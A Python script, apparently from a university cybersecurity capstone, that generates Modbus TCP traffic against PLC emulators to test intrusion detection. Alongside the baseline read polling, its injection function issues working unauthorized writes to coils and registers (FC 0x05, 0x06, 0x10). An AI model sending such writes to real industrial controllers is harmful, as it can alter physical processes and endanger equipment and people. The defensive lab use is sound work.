#!/usr/bin/env python3
"""
===============================================================================
CYB691 Cybersecurity Capstone - Team 4 (Cyber-Physical & Network Defense)
Module: OT Testbed Traffic Generator & Attack Simulator (traffic_generator.py)
Author: Erick Espinosa (Infrastructure, Emulation & Data Generation Lead)
===============================================================================
Description:
  Automates the generation of industrial Modbus TCP network traffic against 
  virtualized PLC emulators (OpenPLC / Conpot). Executes routine HMI polling 
  (Read Holding Registers) and unauthorized command injections (Write Single 
  Coil / Register) to generate test artifacts and trigger Suricata/pfSense logs.
===============================================================================
"""

import os
import sys
import time
import argparse
from datetime import datetime, timezone

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("[-] Error: 'pymodbus' library is not installed.")
    print("[-] Please run: pip install pymodbus")
    sys.exit(1)


def send_baseline_polls(client, count=5, delay=1.0):
    """Executes legitimate HMI routine read polling (Function Code 0x03)."""
    print(f"[*] Starting Baseline HMI Polling (FC 0x03) - {count} iterations...")
    success_count = 0
    
    for i in range(1, count + 1):
        try:
            result = client.read_holding_registers(address=0, count=10)
            timestamp = datetime.now(timezone.utc).isoformat()
            
            if result and not result.isError():
                print(f"  [+] [{timestamp}] Poll {i}/{count} Success: Registers -> {result.registers}")
                success_count += 1
            else:
                print(f"  [!] [{timestamp}] Poll {i}/{count} Error response: {result}")
        except Exception as e:
            print(f"  [!] Exception during poll {i}: {e}")
            
        time.sleep(delay)
        
    print(f"[+] Baseline Polling completed: {success_count}/{count} successful reads.\n")


def inject_unauthorized_commands(client):
    """Executes unauthorized state-altering write command injections (FC 0x05, 0x06, 0x10)."""
    print("[!] INITIATING ATTACK SIMULATION: Unauthorized Modbus Command Injections...")
    timestamp = datetime.now(timezone.utc).isoformat()

    try:
        # 1. Write Single Coil (Function Code 0x05) - Unauthorized actuator state change
        print(f"  [>] [{timestamp}] Injecting FC 0x05 (Write Single Coil) at Address 0 (Value: True)...")
        res_coil = client.write_coil(address=0, value=True)
        if res_coil and not res_coil.isError():
            print("      [+] FC 0x05 executed successfully on target emulator.")
        else:
            print(f"      [!] FC 0x05 response: {res_coil}")

        time.sleep(0.5)

        # 2. Write Single Register (Function Code 0x06) - Unauthorized setpoint modification
        print(f"  [>] [{timestamp}] Injecting FC 0x06 (Write Single Register) at Address 1 (Value: 999)...")
        res_reg = client.write_register(address=1, value=999)
        if res_reg and not res_reg.isError():
            print("      [+] FC 0x06 executed successfully on target emulator.")
        else:
            print(f"      [!] FC 0x06 response: {res_reg}")

        time.sleep(0.5)

        # 3. Write Multiple Registers (Function Code 0x10) - Bulk unauthorized parameter alteration
        print(f"  [>] [{timestamp}] Injecting FC 0x10 (Write Multiple Registers) starting at Address 2...")
        res_multi = client.write_registers(address=2, values=[100, 200, 300])
        if res_multi and not res_multi.isError():
            print("      [+] FC 0x10 executed successfully on target emulator.")
        else:
            print(f"      [!] FC 0x10 response: {res_multi}")

    except Exception as e:
        print(f"  [!] Exception during attack command injection: {e}")
        
    print("[!] Attack simulation sequence completed.\n")


def parse_arguments():
    """Parses command-line arguments for target configuration and execution mode."""
    parser = argparse.ArgumentParser(
        description="OT Testbed Automated Traffic Generator & Attack Simulator (pymodbus)"
    )
    parser.add_argument("-t", "--target", default="127.0.0.1", help="Target IP address of the PLC emulator (default: 127.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=502, help="Modbus TCP port (default: 502)")
    parser.add_argument("-c", "--count", type=int, default=5, help="Number of baseline polling iterations (default: 5)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay in seconds between polls (default: 1.0)")
    parser.add_argument("--attack-only", action="store_true", help="Execute only unauthorized write command injections")
    parser.add_argument("--baseline-only", action="store_true", help="Execute only baseline HMI read polling")
    return parser.parse_args()


def main():
    args = parse_arguments()

    print("======================================================================")
    print(" CYB691 Capstone Team 4 — OT Traffic & Attack Simulation Engine       ")
    print(f" Target: {args.target}:{args.port}                                    ")
    print("======================================================================\n")

    print(f"[*] Connecting to Modbus TCP target at {args.target}:{args.port}...")
    client = ModbusTcpClient(args.target, port=args.port)

    if not client.connect():
        print(f"[-] Connection failed to {args.target}:{args.port}. Ensure the Docker container / proxy is active.")
        sys.exit(1)

    print("[+] Connection established successfully.\n")

    try:
        if not args.attack_only:
            send_baseline_polls(client, count=args.count, delay=args.delay)

        if not args.baseline_only:
            inject_unauthorized_commands(client)

    finally:
        client.close()
        print("[*] Modbus TCP connection closed. Execution finished.")


if __name__ == "__main__":
    main()
